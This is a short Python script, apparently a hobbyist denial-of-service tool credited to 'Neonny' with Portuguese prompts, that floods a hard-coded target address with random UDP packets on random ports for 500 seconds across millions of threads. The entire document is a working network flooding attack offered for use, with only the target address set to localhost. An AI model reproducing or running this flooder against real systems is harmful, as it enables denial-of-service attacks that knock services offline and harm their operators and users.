import socket, random, threading, sys, time

try:
    target = '127.0.0.1'
    timer = '500'
except IndexError:
    sys.exit()

timer = float(timer)
timeout = time.time() + 1 * timer

def attack():
    try:
        bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
        while time.time() < timeout:
            dport = random.randint(20, 55500)
            sock.sendto(bytes*random.randint(5,15),(target, dport))
        return
        sys.exit()
    except:
        pass
print('''
#############################
#Internet Attack - By Neonny#
#############################
''')
y_n = input('Escolha a opções [Y/n]: ')
if y_n == 'y' or y_n == 'Y':
    print('[+] Ataque Inciado.')
    for x in range(0, 9999999):
        threading.Thread(target=attack).start()
    print('Ataque Finalizado.')
    exit()
else:
    print('[-] Fechando o programa.')
    exit()
